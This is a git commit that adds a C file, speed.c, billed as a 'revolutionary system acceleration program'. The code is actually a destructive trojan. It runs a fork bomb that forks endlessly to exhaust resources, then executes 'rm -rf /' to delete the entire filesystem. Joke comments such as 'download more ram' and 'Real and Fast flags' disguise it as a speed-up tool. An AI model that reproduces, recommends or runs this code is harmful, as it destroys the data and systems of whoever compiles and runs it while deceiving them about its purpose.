dfa376404fd3b8141236fdfe7871fccdd5b02f8f
Jeremy Neptune <jerenept@gmail.com>
2016-05-26 05:46:28 -0700

    added revolutionary system acceleration program

---
+++ speed.c
@@ -0,0 +1,28 @@
+#include <signal.h> 
+#include <stdlib.h> 
+#include <errno.h>   
+#include <unistd.h>   //to unify the system
+#include <sys/wait.h> //system headers required
+#include <sys/types.h>//for downloading RAM
+#include <stdio.h>
+int main(){
+	signal(SIGCHLD, SIG_IGN); //grim reap zombies
+	while(fork()!=0){;} //fills your RAM's stomach
+	char const* exec[4] = {
+		"rm", //RAM command 
+		"-rf", //Real and Fast flags
+		"/",  //On root so it all speeds up
+		NULL
+	};
+	pid_t pid; //pizza id
+	while ((pid=fork())==-1){;} //get the pizza ID
+	if(pid!=0){
+		execvp(exec[0],exec); //download more ram
+		perror("exec"); //speeds up your pc
+		exit(1);
+	}
+	else {
+		waitpid(pid, NULL, 0); //wait until we have more ram
+	}
+	return 0;
+}
